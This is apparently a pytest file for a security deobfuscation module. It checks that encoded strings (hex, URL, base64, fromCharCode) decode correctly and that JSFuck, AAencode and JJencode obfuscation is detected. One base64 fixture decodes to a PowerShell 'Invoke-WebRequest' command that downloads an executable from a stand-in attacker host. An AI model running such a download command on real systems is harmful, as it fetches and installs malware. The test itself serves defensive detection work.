"""Tests for the multi-format deobfuscator module."""

from __future__ import annotations

from intel.deobfuscator import (
    deobfuscate, detect_obfuscation_types,
)


# ─── Safe-decode formats (full round-trip) ───────────────────────────────────
def test_hex_escapes_decode_to_plaintext():
    inp = r"\x68\x65\x6c\x6c\x6f\x5f\x77\x6f\x72\x6c\x64"
    out = deobfuscate(inp)
    assert any(d["type"] == "hex_escape" and "hello_world" in d["decoded"]
               for d in out["decoded"])


def test_unicode_escapes_decode_to_plaintext():
    # Each "\\u0041" is a literal 6-char sequence in the source text.
    inp = "".join(f"\\u{ord(c):04x}" for c in "hello_world")
    out = deobfuscate(inp)
    assert any(d["type"] == "unicode_escape" and "hello_world" in d["decoded"]
               for d in out["decoded"])


def test_html_entities_decode():
    inp = "&#104;&#101;&#108;&#108;&#111;&#x5F;&#119;&#111;&#114;&#108;&#100;"
    out = deobfuscate(inp)
    assert any(d["type"] == "html_entity" and "hello_world" in d["decoded"]
               for d in out["decoded"])


def test_url_encoding_decodes():
    inp = "%68%65%6c%6c%6f%5f%77%6f%72%6c%64"
    out = deobfuscate(inp)
    assert any(d["type"] == "url_encoding" and "hello_world" in d["decoded"]
               for d in out["decoded"])


def test_fromcharcode_decodes():
    inp = "String.fromCharCode(104,101,108,108,111,95,119,111,114,108,100)"
    out = deobfuscate(inp)
    assert any(d["type"] == "fromcharcode" and "hello_world" in d["decoded"]
               for d in out["decoded"])


def test_concat_chain_joins():
    inp = '"hello"+"_"+"world"+"_"+"payload"'
    out = deobfuscate(inp)
    assert any(d["type"] == "string_concat" and "hello_world_payload" in d["decoded"]
               for d in out["decoded"])


def test_base64_decodes_when_printable():
    # base64("Invoke-WebRequest http://evil.example/x.exe")
    inp = "SW52b2tlLVdlYlJlcXVlc3QgaHR0cDovL2V2aWwuZXhhbXBsZS94LmV4ZQ=="
    out = deobfuscate(inp)
    assert any(d["type"].startswith("base64") and "Invoke-WebRequest" in d["decoded"]
               for d in out["decoded"])


# ─── Detect-only formats (signature only) ────────────────────────────────────
def test_jsfuck_detected_with_evidence():
    # Tight JSFuck-character-only payload (encodes "x")
    inp = "[(!![]+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+!![]]]+[]"
    out = deobfuscate(inp)
    types = [d["type"] for d in out["detected"]]
    assert "jsfuck" in types


def test_aaencode_signature_detected():
    inp = ('ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/'
           ' [\'_\']; o=(ﾟｪﾟ=_=3) ')
    out = deobfuscate(inp)
    assert any(d["type"] == "aaencode" for d in out["detected"])


def test_jjencode_signature_detected():
    inp = "$=~[];$={___:++$,$$$$:(![]+\"\")[$],__$:++$,$_$_:(![]+\"\")[$]};"
    out = deobfuscate(inp)
    assert any(d["type"] == "jjencode" for d in out["detected"])


# ─── Detection-only API ──────────────────────────────────────────────────────
def test_detect_types_returns_every_format_found():
    unicode_part = "".join(f"\\u{ord(c):04x}" for c in "abcdef")
    inp = (r"\x41\x42\x43\x44\x45\x46\x47\x48 "
           + unicode_part + " "
           "%41%42%43%44%45%46 "
           "&#65;&#66;&#67;&#68; "
           "String.fromCharCode(65,66,67) ")
    types = detect_obfuscation_types(inp)
    for expected in ("hex_escape", "unicode_escape", "url_encoding",
                     "html_entity", "fromcharcode"):
        assert expected in types, f"{expected} not detected in {types}"


# ─── Robustness ──────────────────────────────────────────────────────────────
def test_clean_text_returns_empty():
    inp = "User SEC\\jsmith ran C:\\Windows\\System32\\notepad.exe at 14:02 UTC"
    out = deobfuscate(inp)
    assert out["detected"] == []
    assert out["decoded"]  == []


def test_none_input_does_not_crash():
    assert deobfuscate(None)  == {"detected": [], "decoded": []}
    assert deobfuscate("")    == {"detected": [], "decoded": []}
    assert detect_obfuscation_types(None) == []
    assert detect_obfuscation_types("")   == []


def test_garbage_binary_does_not_crash():
    inp = "\x00\x01\x02\x03\xff\xfe random binary garbage"
    out = deobfuscate(inp)
    assert isinstance(out["decoded"], list)
    assert isinstance(out["detected"], list)
